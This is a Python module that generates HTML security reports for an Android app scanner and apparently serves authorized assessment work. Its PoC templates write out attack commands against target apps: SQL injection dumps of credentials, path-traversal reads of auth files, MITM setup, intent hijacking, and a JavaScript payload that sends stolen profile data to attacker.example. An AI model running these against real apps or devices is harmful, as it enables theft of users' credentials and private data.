"""Enterprise-grade HTML report generation for MSRA."""

import datetime as dt
import html
import os
import shutil
import subprocess
import re
from typing import List, Optional
from collections import Counter

from .utils import Finding


def _get_attr(obj, key, default=None):
    if isinstance(obj, dict):
        return obj.get(key, default)
    return getattr(obj, key, default)



def _build_poc(finding, package: str) -> str:
    """Build application-specific PoC from finding data."""
    extra = _get_attr(finding, 'extra') or {}
    evidence = _get_attr(finding, 'evidence')
    title = (_get_attr(finding, 'title') or '').lower()

    # Extract the real fully-qualified class name from the file path. The
    # decompiled path `.../sources/atws/activity/login/o.java` becomes
    # `atws.activity.login.o`. This is the actual class — use it as the
    # component name in the generated PoC.
    real_fqcn = ''
    if evidence:
        fp = _get_attr(evidence, 'file_path') or ''
        if '/sources/' in fp:
            rel = fp.split('/sources/', 1)[1]
            for ext in ('.java', '.kt'):
                if rel.endswith(ext):
                    rel = rel[:-len(ext)]
                    break
            real_fqcn = rel.replace('/', '.')

    # Component override from extra (e.g. manifest finding has the exact name)
    component = ''
    if isinstance(extra, dict):
        component = extra.get('component', '') or extra.get('activity', '') or ''
    if not component:
        component = real_fqcn or f"{package}.MainActivity"

    # Always prefer regenerated specific PoCs — they're tailored per vuln type
    # and use the real component name. The generic ADB commands stored on the
    # finding object are kept as a fallback.
    lines = _generate_specific_poc(title, package, component, extra, evidence)

    if not lines:
        # Fallback to whatever the scanner produced, with substitutions
        for cmd in (_get_attr(finding, 'adb_commands') or []):
            cmd = cmd.replace('<package>', package)
            cmd = cmd.replace('<activity>', component)
            cmd = cmd.replace('<Component>', component.split('.')[-1])
            cmd = cmd.replace('<component>', component)
            cmd = cmd.replace('<authority>', extra.get('authority', f'{package}.provider') if isinstance(extra, dict) else f'{package}.provider')
            lines.append(cmd)

    return '\n'.join(lines).strip()


def _generate_specific_poc(title: str, package: str, component: str, extra: dict, evidence) -> list:
    """Generate application-specific PoC when generic commands are insufficient."""
    lines = []
    fp = _get_attr(evidence, 'file_path') or '' if evidence else ''
    snippet = _get_attr(evidence, 'snippet') or '' if evidence else ''

    if 'sql injection' in title:
        authority = extra.get('authority', f'{package}.provider') if extra else f'{package}.provider'
        lines = [
            f"# Target: {package}",
            f"# Vulnerability: SQL Injection in ContentProvider",
            f"# Authority: {authority}",
            "",
            "# 1. Enumerate data via UNION injection",
            f'adb shell content query --uri "content://{authority}/" \\',
            f'  --where "1=1) UNION SELECT name,sql,3 FROM sqlite_master--"',
            "",
            "# 2. Extract specific sensitive table",
            f'adb shell content query --uri "content://{authority}/" \\',
            f'  --where "1=2) UNION SELECT username,password,email FROM users--"',
            "",
            "# 3. Read app database directly (if backup enabled)",
            f"adb shell run-as {package} cat /data/data/{package}/databases/*.db > /tmp/app.db",
        ]
    elif 'path traversal' in title:
        authority = extra.get('authority', f'{package}.provider') if extra else f'{package}.provider'
        lines = [
            f"# Target: {package}",
            f"# Vulnerability: Path Traversal in ContentProvider",
            "",
            "# 1. Read SharedPreferences (auth tokens)",
            f'adb shell content read --uri "content://{authority}/../../shared_prefs/auth.xml"',
            "",
            "# 2. Read main database",
            f'adb shell content read --uri "content://{authority}/../../databases/app_database.db"',
            "",
            "# 3. Enumerate internal files",
            f"adb shell run-as {package} ls -la /data/data/{package}/",
        ]
    elif 'webview' in title and 'ssl' in title:
        lines = [
            f"# Target: {package}",
            f"# Vulnerability: WebView SSL Certificate Validation Bypass",
            "",
            "# 1. Set up MITM proxy (mitmproxy)",
            "mitmproxy --listen-port 8080 --ssl-insecure",
            "",
            "# 2. Route device traffic through proxy",
            "adb shell settings put global http_proxy <attacker_ip>:8080",
            "",
            "# 3. Launch app and capture HTTPS traffic",
            f"adb shell monkey -p {package} -c android.intent.category.LAUNCHER 1",
            "",
            "# 4. Observe decrypted traffic (credentials, tokens, API responses)",
            "# All HTTPS traffic is now visible in plaintext",
        ]
    elif 'webview' in title and ('javascript' in title or 'js enabled' in title):
        comp = component or f"{package}.WebViewActivity"
        lines = [
            f"# Target: {package}",
            f"# Vulnerability: WebView JavaScript Enabled - Potential XSS",
            "",
            f"# 1. Launch WebView activity with attacker URL",
            f'adb shell am start -n {package}/{comp} \\',
            f'  --es "url" "https://attacker.example/payload.html"',
            "",
            "# 2. payload.html - steal cookies/tokens from WebView context",
            "#   fetch('/api/user/profile', {credentials:'include'})",
            "#     .then(r=>r.text())",
            "#     .then(d=>fetch('https://attacker.example/log?d='+btoa(d)));",
            "",
            "# 3. If JavascriptInterface is exposed, call native methods:",
            "#   window.jsInterface.getAuthToken();",
        ]
    elif 'exported' in title and 'activity' in title:
        comp = component or f"{package}.MainActivity"
        lines = [
            f"# Target: {package}",
            f"# Vulnerability: Exported Activity Without Permission",
            f"# Component: {comp}",
            "",
            "# 1. Launch exported activity directly",
            f"adb shell am start -n {package}/{comp}",
            "",
            "# 2. Inject malicious Intent extras",
            f"adb shell am start -n {package}/{comp} \\",
            f'  --es "url" "https://attacker.example" \\',
            f'  --ez "admin" true \\',
            f'  --es "token" "forged_token_value"',
            "",
            "# 3. From malicious app (Android Java)",
            f'Intent i = new Intent();',
            f'i.setComponent(new ComponentName("{package}", "{comp}"));',
            f'i.putExtra("bypass_auth", true);',
            f'startActivity(i);',
        ]
    elif 'exported' in title and ('service' in title or 'receiver' in title):
        comp = component or f"{package}.SomeService"
        comp_type = 'startservice' if 'service' in title else 'broadcast'
        lines = [
            f"# Target: {package}",
            f"# Vulnerability: Exported Component Without Permission",
            f"# Component: {comp}",
            "",
            f"adb shell am {comp_type} -n {package}/{comp}",
            "",
            "# With crafted extras:",
            f"adb shell am {comp_type} -n {package}/{comp} \\",
            f'  --es "cmd" "privileged_operation" \\',
            f'  --es "data" "attacker_controlled"',
        ]
    elif 'hardcoded' in title and ('credential' in title or 'key' in title or 'secret' in title):
        file_name = os.path.basename(fp).replace('.java', '').replace('.kt', '') if fp else 'TargetClass'
        lines = [
            f"# Target: {package}",
            f"# Vulnerability: Hardcoded Credentials in {file_name}",
            "",
            "# 1. Extract secrets via decompilation",
            f"jadx -d decompiled/ {package}.apk",
            f"grep -r 'password\\|secret\\|api_key\\|token' decompiled/sources/ --include='*.java'",
            "",
            "# 2. Use extracted credentials to access backend",
            "# curl -H 'Authorization: Bearer <extracted_token>' https://api.target.com/v1/users",
            "",
            "# 3. Access app internals if debuggable",
            f"adb shell run-as {package} cat /data/data/{package}/shared_prefs/*.xml",
        ]
    elif 'aes ecb' in title or 'des' in title or 'rc4' in title:
        lines = [
            f"# Target: {package}",
            f"# Vulnerability: Weak Cryptography",
            "",
            "# 1. Extract encrypted data from app storage",
            f"adb shell run-as {package} cat /data/data/{package}/shared_prefs/*.xml",
            f"adb shell run-as {package} cp /data/data/{package}/databases/*.db /sdcard/",
            "adb pull /sdcard/*.db /tmp/",
            "",
            "# 2. Decrypt with known-weak algorithm (ECB - no IV needed)",
            "# python3 -c \"from Crypto.Cipher import AES; ...",
            "# AES ECB: blocks encrypt independently, patterns leak plaintext structure",
        ]
    elif 'debuggable' in title:
        lines = [
            f"# Target: {package}",
            f"# Vulnerability: Debuggable Build",
            "",
            "# 1. Access app's private data without root",
            f"adb shell run-as {package} ls -la /data/data/{package}/",
            f"adb shell run-as {package} cat /data/data/{package}/shared_prefs/*.xml",
            "",
            "# 2. Attach debugger for runtime inspection",
            f"adb shell am set-debug-app -w {package}",
            f"adb shell monkey -p {package} 1",
            "# Connect via Android Studio: Run > Attach Debugger to Android Process",
            "",
            "# 3. Extract all app data",
            f"adb backup -f {package}.ab -apk {package}",
            "dd if=backup.ab bs=24 skip=1 | python3 -c \"import zlib,sys; sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))\" | tar xvf -",
        ]
    elif 'cleartext' in title or 'http url' in title:
        lines = [
            f"# Target: {package}",
            f"# Vulnerability: Cleartext HTTP Traffic",
            "",
            "# 1. Set up network interception (same WiFi or hotspot)",
            "sudo mitmproxy -p 8080 --mode transparent",
            "",
            "# 2. Route device traffic",
            "adb shell settings put global http_proxy <attacker_ip>:8080",
            "",
            "# 3. Launch app and observe plaintext HTTP",
            f"adb shell monkey -p {package} -c android.intent.category.LAUNCHER 1",
            "",
            "# All HTTP requests/responses including credentials visible in mitmproxy",
        ]
    elif 'intent redirect' in title or 'parcelable' in title:
        comp = component or f"{package}.RedirectActivity"
        lines = [
            f"# Target: {package}",
            f"# Vulnerability: Intent Redirect / Component Hijack",
            "",
            "# From a malicious Android app:",
            f'// Outer intent targeting vulnerable exported activity',
            f'Intent outer = new Intent();',
            f'outer.setComponent(new ComponentName("{package}", "{comp}"));',
            "",
            f'// Inner intent targeting protected non-exported activity',
            f'Intent inner = new Intent();',
            f'inner.setComponent(new ComponentName("{package}", "{package}.AdminActivity"));',
            f'inner.putExtra("bypass_auth", true);',
            f'inner.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);',
            "",
            f'outer.putExtra("next_intent", inner);  // or "android.intent.extra.INTENT"',
            f'startActivity(outer);',
            "",
            "# This allows any app to access non-exported/protected activities",
        ]
    else:
        # Generic fallback using package
        lines = [
            f"# Target: {package}",
            f"adb shell monkey -p {package} -c android.intent.category.LAUNCHER 1",
        ]

    return lines


def _severity_icon(severity: str) -> str:
    sev = severity.lower()
    icons = {
        'critical': 'fa-skull-crossbones',
        'high':     'fa-circle-exclamation',
        'medium':   'fa-triangle-exclamation',
        'low':      'fa-circle-info',
        'info':     'fa-circle-info',
    }
    return icons.get(sev, 'fa-circle-info')


def _category_icon(category: str) -> str:
    cat = category.lower()
    if 'webview'     in cat: return 'fa-globe'
    if 'crypto'      in cat: return 'fa-lock'
    if 'intent'      in cat: return 'fa-share-nodes'
    if 'storage'     in cat: return 'fa-database'
    if 'network'     in cat: return 'fa-wifi'
    if 'permission'  in cat: return 'fa-shield-halved'
    if 'component'   in cat: return 'fa-puzzle-piece'
    if 'logging'     in cat: return 'fa-scroll'
    if 'credential'  in cat: return 'fa-key'
    if 'input'       in cat: return 'fa-filter'
    if 'communicat'  in cat: return 'fa-tower-broadcast'
    if 'binary'      in cat: return 'fa-microchip'
    return 'fa-bug'


def generate_html_report(findings: List, output_path: str, metadata: dict, json_data: dict = None) -> None:
    """Generate enterprise-grade HTML security report."""
    import json as json_module

    created      = dt.datetime.now().strftime("%B %d, %Y  %H:%M")
    title        = metadata.get("title", "Mobile Security Assessment")
    pkg          = metadata.get("package", "unknown")
    apk_name     = metadata.get("apk", "unknown")
    src_count    = metadata.get("source_files", "N/A")

    # Severity counts
    sev_counts = {"Critical": 0, "High": 0, "Medium": 0, "Low": 0, "Info": 0}
    category_counts: Counter = Counter()
    for f in findings:
        sev = _get_attr(f, 'severity') or "Medium"
        if sev not in sev_counts:
            sev = "Medium"
        sev_counts[sev] += 1
        extra = _get_attr(f, 'extra') or {}
        cat = extra.get("category", "Other") if isinstance(extra, dict) else "Other"
        category_counts[cat] += 1

    total = len(findings)
    categories = sorted(category_counts.keys())

    # Category filter options
    cat_options = '\n'.join(
        f'<option value="{html.escape(c)}">{html.escape(c)} ({category_counts[c]})</option>'
        for c in categories
    )

    # Build finding cards HTML
    cards_html = '\n'.join(_render_finding(f, i + 1, pkg) for i, f in enumerate(findings))

    # Embedded JSON
    findings_json = []
    for fi, f in enumerate(findings):
        extra    = _get_attr(f, 'extra') or {}
        evidence = _get_attr(f, 'evidence')
        findings_json.append({
            'id':          fi + 1,
            'title':       _get_attr(f, 'title'),
            'severity':    _get_attr(f, 'severity'),
            'description': _get_attr(f, 'description'),
            'attack_path': _get_attr(f, 'attack_path'),
            'category':    extra.get('category', 'Other') if isinstance(extra, dict) else 'Other',
            'cwe':         extra.get('cwe', []) if isinstance(extra, dict) else [],
            'references':  _get_attr(f, 'references') or [],
            'evidence': {
                'file':    _get_attr(evidence, 'file_path') if evidence else None,
                'line':    _get_attr(evidence, 'line_number') if evidence else None,
                'snippet': _get_attr(evidence, 'snippet') if evidence else None,
            } if evidence else None,
            'poc': _build_poc(f, pkg),
            'remediation': extra.get('remediation') if isinstance(extra, dict) else None,
            'adb_commands':         _get_attr(f, 'adb_commands') or [],
            'attack_description':   extra.get('attack_description') if isinstance(extra, dict) else None,
            'attack_prerequisites': extra.get('attack_prerequisites') if isinstance(extra, dict) else None,
            'attack_steps':         extra.get('attack_steps') if isinstance(extra, dict) else None,
            'attack_impact':        extra.get('attack_impact') if isinstance(extra, dict) else None,
            'malicious_apk_code':   extra.get('malicious_apk_code') if isinstance(extra, dict) else None,
            'attack_vector':        extra.get('attack_vector') if isinstance(extra, dict) else None,
        })

    embedded_json = json_module.dumps({
        'package': pkg, 'apk': apk_name, 'scan_time': created,
        'total_findings': total,
        'severity_counts': sev_counts, 'findings': findings_json,
    }, indent=2)
    # Prevent any </script> inside the JSON from prematurely closing the
    # <script type="application/json"> block. JSON's \/ escape decodes to /
    # so JSON.parse still gets the correct string; the HTML parser does not.
    embedded_json = embedded_json.replace('</', '<\\/')

    html_content = f'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>{html.escape(title)}</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" crossorigin="anonymous">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/bash.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/java.min.js"></script>
<style>
:root {{
  --bg:          #0d1117;
  --bg2:         #161b22;
  --bg3:         #1c2128;
  --border:      #30363d;
  --border2:     #21262d;
  --text:        #e6edf3;
  --text2:       #8b949e;
  --text3:       #6e7681;
  --accent:      #2f81f7;
  --accent-glow: rgba(47,129,247,0.15);
  --critical:    #ef4444;
  --high:        #f97316;
  --medium:      #eab308;
  --low:         #22c55e;
  --info:        #06b6d4;
  --radius:      10px;
  --radius-sm:   6px;
  --shadow:      0 4px 20px rgba(0,0,0,0.4);
}}
*, *::before, *::after {{ box-sizing: border-box; margin: 0; padding: 0; }}
html {{ scroll-behavior: smooth; }}
body {{
  font-family: 'Inter', system-ui, sans-serif;
  background: var(--bg);
  color: var(--text);
  font-size: 14px;
  line-height: 1.6;
  min-height: 100vh;
}}
a {{ color: var(--accent); text-decoration: none; }}
a:hover {{ text-decoration: underline; }}
code, pre {{ font-family: 'JetBrains Mono', monospace; }}

/* ── TOP NAV ── */
.topnav {{
  position: sticky; top: 0; z-index: 100;
  background: rgba(13,17,23,0.95);
  backdrop-filter: blur(12px);
  border-bottom: 1px solid var(--border);
  padding: 0 32px;
  height: 58px;
  display: flex; align-items: center; gap: 20px;
}}
.topnav-brand {{
  display: flex; align-items: center; gap: 10px;
  font-weight: 700; font-size: 15px; color: var(--text); white-space: nowrap;
}}
.topnav-brand i {{ color: var(--accent); font-size: 18px; }}
.topnav-pkg {{
  background: var(--bg2); border: 1px solid var(--border);
  padding: 4px 12px; border-radius: 20px;
  font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--text2);
}}
.topnav-spacer {{ flex: 1; }}
.topnav-meta {{ display: flex; align-items: center; gap: 16px; }}
.topnav-meta span {{ font-size: 12px; color: var(--text2); display:flex; align-items:center; gap:5px; }}
.topnav-meta i {{ font-size: 11px; }}
.btn {{
  display: inline-flex; align-items: center; gap: 7px;
  padding: 7px 16px; border-radius: var(--radius-sm);
  font-size: 13px; font-weight: 500; cursor: pointer;
  border: 1px solid var(--border); background: var(--bg2);
  color: var(--text); transition: all 0.15s;
}}
.btn:hover {{ background: var(--bg3); border-color: var(--accent); color: var(--accent); }}
.btn-primary {{ background: var(--accent); border-color: var(--accent); color: #fff; }}
.btn-primary:hover {{ background: #388bfd; border-color: #388bfd; color: #fff; }}

/* ── MAIN LAYOUT ── */
.main {{ max-width: 1280px; margin: 0 auto; padding: 32px 32px 64px; }}

/* ── SUMMARY ── */
.summary-grid {{
  margin-bottom: 32px;
}}
.stats-grid {{
  display: grid;
  grid-template-columns: repeat(5, 1fr);
  gap: 14px;
  align-content: start;
}}
.stat-card {{
  background: var(--bg2); border: 1px solid var(--border);
  border-radius: var(--radius); padding: 20px 18px;
  display: flex; flex-direction: column; gap: 6px;
  transition: transform 0.15s, border-color 0.15s;
  position: relative; overflow: hidden;
}}
.stat-card::before {{
  content: '';
  position: absolute; top: 0; left: 0; right: 0; height: 3px;
}}
.stat-card.critical::before {{ background: var(--critical); }}
.stat-card.high::before     {{ background: var(--high); }}
.stat-card.medium::before   {{ background: var(--medium); }}
.stat-card.low::before      {{ background: var(--low); }}
.stat-card.info::before     {{ background: var(--info); }}
.stat-card:hover {{ transform: translateY(-2px); }}
.stat-card.critical:hover {{ border-color: var(--critical); }}
.stat-card.high:hover     {{ border-color: var(--high); }}
.stat-card.medium:hover   {{ border-color: var(--medium); }}
.stat-card.low:hover      {{ border-color: var(--low); }}
.stat-card.info:hover     {{ border-color: var(--info); }}
.stat-icon {{ font-size: 18px; margin-bottom: 2px; }}
.stat-card.critical .stat-icon {{ color: var(--critical); }}
.stat-card.high .stat-icon     {{ color: var(--high); }}
.stat-card.medium .stat-icon   {{ color: var(--medium); }}
.stat-card.low .stat-icon      {{ color: var(--low); }}
.stat-card.info .stat-icon     {{ color: var(--info); }}
.stat-num {{
  font-size: 32px; font-weight: 700; line-height: 1;
  font-variant-numeric: tabular-nums;
}}
.stat-card.critical .stat-num {{ color: var(--critical); }}
.stat-card.high .stat-num     {{ color: var(--high); }}
.stat-card.medium .stat-num   {{ color: var(--medium); }}
.stat-card.low .stat-num      {{ color: var(--low); }}
.stat-card.info .stat-num     {{ color: var(--info); }}
.stat-lbl {{ font-size: 12px; font-weight: 600; color: var(--text2); text-transform: uppercase; letter-spacing: 0.06em; }}
.stat-meta {{ font-size: 11px; color: var(--text3); margin-top: 2px; }}

/* ── FILTERS ── */
.filter-bar {{
  background: var(--bg2); border: 1px solid var(--border);
  border-radius: var(--radius); padding: 16px 20px;
  margin-bottom: 20px;
  display: flex; flex-wrap: wrap; gap: 10px; align-items: center;
}}
.filter-bar .search-wrap {{
  flex: 1; min-width: 220px; position: relative;
}}
.filter-bar .search-wrap i {{
  position: absolute; left: 12px; top: 50%; transform: translateY(-50%);
  color: var(--text3); font-size: 13px;
}}
.filter-bar input[type=search], .filter-bar select {{
  background: var(--bg); border: 1px solid var(--border);
  color: var(--text); border-radius: var(--radius-sm);
  padding: 8px 12px; font-size: 13px; outline: none;
  font-family: inherit; transition: border-color 0.15s;
}}
.filter-bar input[type=search] {{
  width: 100%; padding-left: 34px;
}}
.filter-bar input[type=search]::placeholder {{ color: var(--text3); }}
.filter-bar select {{
  min-width: 170px; cursor: pointer; appearance: none;
  padding-right: 28px;
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='%238b949e' viewBox='0 0 16 16'%3E%3Cpath d='M7.247 11.14L2.451 5.658C1.885 5.013 2.345 4 3.204 4h9.592a1 1 0 0 1 .753 1.659l-4.796 5.48a1 1 0 0 1-1.506 0z'/%3E%3C/svg%3E");
  background-repeat: no-repeat; background-position: right 8px center; background-size: 12px;
}}
.filter-bar input:focus, .filter-bar select:focus {{ border-color: var(--accent); }}
.filter-bar .divider {{ width: 1px; height: 24px; background: var(--border); }}
.filter-pill {{
  display: inline-flex; align-items: center; gap: 5px;
  background: var(--bg3); border: 1px solid var(--border);
  border-radius: 20px; padding: 5px 12px;
  font-size: 12px; font-weight: 500; color: var(--text2);
}}
#resultCount {{ font-size: 12px; color: var(--text3); white-space: nowrap; margin-left: auto; }}

/* ── FINDINGS ── */
.findings-list {{ display: flex; flex-direction: column; gap: 8px; }}

.finding-card {{
  background: var(--bg2); border: 1px solid var(--border);
  border-radius: var(--radius); overflow: hidden;
  transition: border-color 0.15s;
}}
.finding-card:hover {{ border-color: #444c56; }}
.finding-card.is-open {{ border-color: var(--border); }}

.card-header {{
  display: flex; align-items: center; gap: 14px;
  padding: 14px 18px; cursor: pointer;
  user-select: none;
}}
.card-header:hover {{ background: rgba(255,255,255,0.02); }}

.sev-pill {{
  flex-shrink: 0;
  display: inline-flex; align-items: center; gap: 6px;
  padding: 4px 10px; border-radius: 20px;
  font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.05em;
  white-space: nowrap;
}}
.sev-pill.critical {{ background: rgba(239,68,68,0.15);  color: #f87171; border: 1px solid rgba(239,68,68,0.3); }}
.sev-pill.high     {{ background: rgba(249,115,22,0.15); color: #fb923c; border: 1px solid rgba(249,115,22,0.3); }}
.sev-pill.medium   {{ background: rgba(234,179,8,0.15);  color: #fbbf24; border: 1px solid rgba(234,179,8,0.3); }}
.sev-pill.low      {{ background: rgba(34,197,94,0.15);  color: #4ade80; border: 1px solid rgba(34,197,94,0.3); }}
.sev-pill.info     {{ background: rgba(6,182,212,0.15);  color: #22d3ee; border: 1px solid rgba(6,182,212,0.3); }}

.card-title {{
  flex: 1; font-weight: 500; font-size: 14px; color: var(--text);
}}
.card-title .finding-num {{
  color: var(--text3); font-size: 12px; margin-right: 6px; font-weight: 400;
}}
.card-meta {{ display: flex; align-items: center; gap: 8px; }}
.cat-chip {{
  display: inline-flex; align-items: center; gap: 5px;
  background: var(--bg3); border: 1px solid var(--border2);
  border-radius: 6px; padding: 3px 9px;
  font-size: 11px; color: var(--text3);
}}
.cat-chip i {{ font-size: 10px; }}
.deep-chip {{
  background: rgba(139,92,246,0.15); border: 1px solid rgba(139,92,246,0.3);
  color: #a78bfa; padding: 3px 9px; border-radius: 6px; font-size: 11px;
  display: inline-flex; align-items: center; gap: 5px;
}}
.chevron {{
  color: var(--text3); font-size: 12px;
  transition: transform 0.2s; flex-shrink: 0;
}}
.finding-card.is-open .chevron {{ transform: rotate(180deg); }}

/* ── CARD BODY ── */
.card-body {{ display: none; border-top: 1px solid var(--border); }}
.finding-card.is-open .card-body {{ display: block; }}

/* Tabs */
.tab-nav {{
  display: flex; gap: 0;
  background: var(--bg3); border-bottom: 1px solid var(--border);
  padding: 0 18px;
}}
.tab-btn {{
  padding: 10px 16px; font-size: 13px; font-weight: 500;
  color: var(--text2); cursor: pointer; border: none;
  background: transparent; border-bottom: 2px solid transparent;
  margin-bottom: -1px; transition: color 0.15s, border-color 0.15s;
  display: inline-flex; align-items: center; gap: 6px;
}}
.tab-btn:hover {{ color: var(--text); }}
.tab-btn.active {{ color: var(--accent); border-bottom-color: var(--accent); }}
.tab-btn i {{ font-size: 12px; }}
.tab-pane {{ display: none; padding: 20px 22px; }}
.tab-pane.active {{ display: block; }}

/* Description section */
.desc-text {{ color: var(--text2); line-height: 1.7; font-size: 13.5px; }}
.desc-text code {{
  background: var(--bg3); border: 1px solid var(--border);
  padding: 1px 5px; border-radius: 4px; font-size: 12px;
}}

/* Evidence */
.evidence-block {{
  background: var(--bg); border: 1px solid var(--border);
  border-radius: var(--radius-sm); overflow: hidden; margin-top: 14px;
}}
.evidence-file {{
  display: flex; align-items: center; gap: 8px;
  padding: 8px 14px; background: var(--bg3);
  border-bottom: 1px solid var(--border);
  font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--text2);
}}
.evidence-file .line-badge {{
  margin-left: auto; background: var(--bg2); border: 1px solid var(--border);
  padding: 2px 8px; border-radius: 4px; font-size: 11px; color: var(--text3);
}}
.evidence-snippet {{ padding: 0 !important; overflow: auto; max-height: 200px; }}
.evidence-snippet pre {{ margin: 0 !important; border-radius: 0 !important; }}
.evidence-snippet pre code {{ padding: 14px 16px !important; font-size: 12.5px !important; }}

/* PoC section */
.poc-block {{
  background: var(--bg); border: 1px solid var(--border);
  border-radius: var(--radius-sm); overflow: hidden; margin-top: 0;
}}
.poc-header-bar {{
  display: flex; align-items: center; gap: 10px;
  padding: 8px 14px; background: var(--bg3);
  border-bottom: 1px solid var(--border);
}}
.poc-header-bar span {{
  font-size: 11px; font-weight: 600; color: var(--text3);
  text-transform: uppercase; letter-spacing: 0.07em;
}}
.poc-header-bar .dots {{ display: flex; gap: 6px; }}
.poc-header-bar .dot {{ width: 11px; height: 11px; border-radius: 50%; }}
.poc-header-bar .dot-red   {{ background: #ef4444; }}
.poc-header-bar .dot-yellow{{ background: #f59e0b; }}
.poc-header-bar .dot-green {{ background: #22c55e; }}
.copy-poc-btn {{
  margin-left: auto; background: var(--bg2); border: 1px solid var(--border);
  color: var(--text2); padding: 4px 10px; border-radius: var(--radius-sm);
  font-size: 11px; cursor: pointer; display: inline-flex; align-items: center; gap: 5px;
  transition: all 0.15s; font-family: inherit;
}}
.copy-poc-btn:hover {{ border-color: var(--accent); color: var(--accent); }}
.poc-code {{ overflow: auto; max-height: 380px; }}
.poc-code pre {{ margin: 0 !important; border-radius: 0 !important; }}
.poc-code pre code {{ padding: 14px 16px !important; font-size: 12.5px !important; line-height: 1.65 !important; }}

/* Info row */
.info-grid {{
  display: grid; grid-template-columns: repeat(auto-fill, minmax(180px,1fr));
  gap: 12px; margin-top: 14px;
}}
.info-cell {{
  background: var(--bg); border: 1px solid var(--border2);
  border-radius: var(--radius-sm); padding: 12px 14px;
}}
.info-cell .ic-label {{ font-size: 10px; text-transform: uppercase; letter-spacing: 0.08em; color: var(--text3); margin-bottom: 4px; }}
.info-cell .ic-val   {{ font-size: 13px; font-weight: 600; color: var(--text); }}
.info-cell .ic-val.danger {{ color: #f87171; }}
.info-cell .ic-val.safe   {{ color: #4ade80; }}

/* Remediation */
.remediation-block {{
  background: rgba(34,197,94,0.05); border: 1px solid rgba(34,197,94,0.2);
  border-radius: var(--radius-sm); padding: 16px 18px;
  color: var(--text2); line-height: 1.7; font-size: 13.5px;
  white-space: pre-wrap;
}}
.remediation-block code {{
  background: var(--bg3); border: 1px solid var(--border);
  padding: 1px 5px; border-radius: 4px; font-size: 12px; color: #4ade80;
}}

/* CWE / CVE chips */
.ref-chips {{ display: flex; flex-wrap: wrap; gap: 8px; margin-top: 12px; }}
.cwe-chip {{
  display: inline-flex; align-items: center; gap: 5px;
  background: rgba(234,179,8,0.1); border: 1px solid rgba(234,179,8,0.25);
  color: #fbbf24; padding: 4px 10px; border-radius: 6px; font-size: 11px; font-weight: 600;
}}
.ref-link {{
  display: inline-flex; align-items: center; gap: 5px;
  background: var(--bg3); border: 1px solid var(--border2);
  color: var(--text2); padding: 4px 10px; border-radius: 6px; font-size: 11px;
  transition: all 0.15s;
}}
.ref-link:hover {{ border-color: var(--accent); color: var(--accent); text-decoration: none; }}

/* WebView config grid */
.wv-grid {{ display: flex; flex-wrap: wrap; gap: 10px; margin-top: 14px; }}
.wv-cell {{
  flex: 1; min-width: 120px;
  background: var(--bg); border: 1px solid var(--border2);
  border-radius: var(--radius-sm); padding: 12px 14px;
  display: flex; flex-direction: column; gap: 4px;
}}
.wv-cell .wc-label {{ font-size: 10px; text-transform: uppercase; letter-spacing: 0.08em; color: var(--text3); }}
.wv-cell .wc-val {{ font-size: 13px; font-weight: 600; }}
.wv-cell.danger {{ border-color: rgba(239,68,68,0.4); }}
.wv-cell.danger .wc-val {{ color: #f87171; }}
.wv-cell.safe .wc-val {{ color: #4ade80; }}

/* Section heading */
.section-heading {{
  font-size: 11px; font-weight: 700; text-transform: uppercase;
  letter-spacing: 0.08em; color: var(--text3); margin-bottom: 10px;
  display: flex; align-items: center; gap: 7px;
}}
.section-heading::after {{ content: ''; flex: 1; height: 1px; background: var(--border2); }}

/* Attack scenario */
.attack-block {{
  background: rgba(239,68,68,0.05); border: 1px solid rgba(239,68,68,0.2);
  border-radius: var(--radius-sm); padding: 14px 16px; margin-top: 12px;
}}
.attack-block .atk-steps ol {{ padding-left: 20px; color: var(--text2); font-size: 13px; }}
.attack-block .atk-steps li {{ margin: 6px 0; line-height: 1.6; }}

/* Empty state */
.empty-state {{
  text-align: center; padding: 64px 32px;
  color: var(--text3);
}}
.empty-state i {{ font-size: 40px; margin-bottom: 16px; display: block; }}

/* Confidence + location chips */
.conf-chip {{
  display: inline-flex; align-items: center; gap: 5px;
  padding: 3px 9px; border-radius: 6px; font-size: 11px;
  border: 1px solid;
}}
.conf-chip.conf-high   {{ background: rgba(34,197,94,0.1);  color: #4ade80; border-color: rgba(34,197,94,0.3); }}
.conf-chip.conf-medium {{ background: rgba(234,179,8,0.1);  color: #fbbf24; border-color: rgba(234,179,8,0.3); }}
.conf-chip.conf-low    {{ background: rgba(107,114,128,0.1); color: #9ca3af; border-color: rgba(107,114,128,0.3); }}
.loc-chip {{
  display: inline-flex; align-items: center; gap: 5px;
  background: rgba(107,114,128,0.1); color: #9ca3af;
  border: 1px solid rgba(107,114,128,0.3);
  padding: 3px 9px; border-radius: 6px; font-size: 11px;
}}

/* Reviewer notes blocks */
.reviewer-block {{
  background: var(--bg); border: 1px solid var(--border2);
  border-left: 3px solid var(--accent);
  border-radius: var(--radius-sm); padding: 14px 18px;
  color: var(--text2); line-height: 1.7; font-size: 13.5px;
}}
.verify-block {{
  background: rgba(47,129,247,0.04); border: 1px solid rgba(47,129,247,0.15);
  border-radius: var(--radius-sm); padding: 14px 18px 14px 14px;
}}
.verify-block ol {{ padding-left: 22px; color: var(--text2); font-size: 13px; }}
.verify-block li {{ margin: 8px 0; line-height: 1.6; }}
.verify-block li::marker {{ color: var(--accent); font-weight: 700; }}
.fp-block {{
